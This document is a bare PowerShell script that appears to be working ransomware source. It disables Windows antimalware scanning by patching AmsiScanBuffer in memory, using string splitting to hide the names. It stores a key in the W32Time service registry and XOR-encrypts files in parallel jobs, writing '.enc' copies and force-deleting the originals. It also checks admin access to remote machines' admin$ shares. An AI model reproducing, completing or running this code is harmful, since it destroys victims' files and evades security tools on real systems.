$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
$global:user = $env:USERNAME

$max = 100
Stop-Job *
Remove-Job *

Function myKey() {
    $myX = ('0x{0:x}' -f (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\services\W32Time\Parameters' Polifichds -ErrorAction SilentlyContinue | % Polifichds))
    if ($myX -eq "0x")
    {
        $myRand = Get-Random -Minimum 1 -Maximum 99
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\services\W32Time\Parameters' -PropertyType binary -Value ([byte[]]('0x'+$myRand)) -Name Polifichds | Out-Null
        $myX = ('0x{0:x}' -f (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\services\W32Time\Parameters' Polifichds -ErrorAction SilentlyContinue | % Polifichds))
    }
    return ('0x{0:x}' -f ($myX -bxor ('0x{0:x}' -f (($env:COMPUTERNAME.Length + $env:USERNAME.Length)*2))))
}
($global:thisKey = (myKey))

Function AsyncJobs([System.IO.FileSystemInfo]$file) {
$sb = { param($file,$thisKey)
	$filename = $file.FullName;
	if ($file -is [System.IO.DirectoryInfo]) { return }
	$data = [System.IO.File]::ReadAllBytes("$filename")
	$len = $data.Count
	$xored = New-Object Byte[] $len
	for($i=0; $i -lt $len ; $i++)
	{
		$xored[$i] = $data[$i] -bxor $thisKey
	}
    $new_filename = "$($filename).enc"
	[System.IO.File]::WriteAllBytes("$new_filename", $xored)	
	Remove-Item $filename -Force
        }

		 if ((Get-Job -State Running).Count -lt $max) {
            Start-Job -Name $file.name -ScriptBlock $sb -ArgumentList $file,$thisKey | out-null
         } else {
            (Get-Job -State Running) | Wait-Job -Any
            Start-Job -Name $file.name -ScriptBlock $sb -ArgumentList $file,$thisKey | out-null
         }
} 

Function IsAdminUser([string]$Comp) { 
$isAdmin = $false
if (Test-Connection -ComputerName $Comp -Count 1) { 
    tee "\\$Comp\admin$\test.txt" -ErrorAction SilentlyContinue
    if ($isAdmin = (Test-Path "\\$Comp\admin$\test.txt")) { rm "\\$Comp\admin$\test.txt" -force -Confirm:$false  }
}
return $isAdmin
}

